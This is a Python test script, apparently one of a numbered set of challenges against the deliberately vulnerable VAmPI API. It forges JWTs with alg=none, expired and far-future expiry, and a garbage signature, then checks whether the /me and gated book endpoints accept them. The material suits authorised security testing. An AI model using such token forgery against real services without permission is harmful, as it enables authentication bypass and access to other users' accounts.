#!/usr/bin/env python3
"""
vampi_challenge_09_jwt_manipulation.py — JWT validation weaknesses.

We craft several malformed JWTs and present them to VAmPI's auth-gated
endpoints:
  * alg=none        (unsigned)
  * expired         (valid shape, past exp)
  * long-life       (valid shape, far-future exp)
  * garbage         (nonsense signature)
If any is ACCEPTED (200) on an endpoint that should require a valid token,
that's a broken-authentication / JWT finding. On this instance alg=none is
rejected (401) — the script reports honestly either way.

Read-only; safe to re-run.
Run: python3 vampi_challenge_09_jwt_manipulation.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def try_token(base, label, token, tout):
    r = requests.get(f"{base}/me", headers=vc.auth_headers(token, vc.consumer_headers(809)), timeout=tout)
    accepted = r.status_code == 200
    print(f"{label:12} -> HTTP {r.status_code} {'[ACCEPTED]' if accepted else ''}")
    return accepted


def main():
    ap = argparse.ArgumentParser(description="JWT alg=none / expired / long-life / garbage")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    sub = vc.known_users(cfg)[0]["username"]

    cases = [
        ("alg=none", vc.make_jwt(sub, alg="none")),
        ("expired", vc.make_jwt(sub, alg="HS256", exp_delta=-86400)),
        ("long-life", vc.make_jwt(sub, alg="HS256", exp_delta=10 * 365 * 86400)),
        ("garbage", vc.make_jwt(sub, alg="HS256", sig="garbagegarbage")),
    ]
    accepted = 0
    for label, tok in cases:
        if try_token(base, label, tok, tout):
            accepted += 1

    # alg=none presented against a GATED endpoint (book read requires auth).
    r = requests.get(f"{base}/books/v1/bookTitle10",
                     headers=vc.auth_headers(vc.make_jwt("other-user", alg="none"), vc.consumer_headers(810)), timeout=tout)
    print(f"none@gate  -> HTTP {r.status_code} {'[ACCEPTED]' if r.status_code == 200 else ''}  (gated book read w/ alg=none)")

    print(f"\nDone — {accepted}/{len(cases)} crafted token(s) accepted by the auth gate.")


if __name__ == "__main__":
    main()
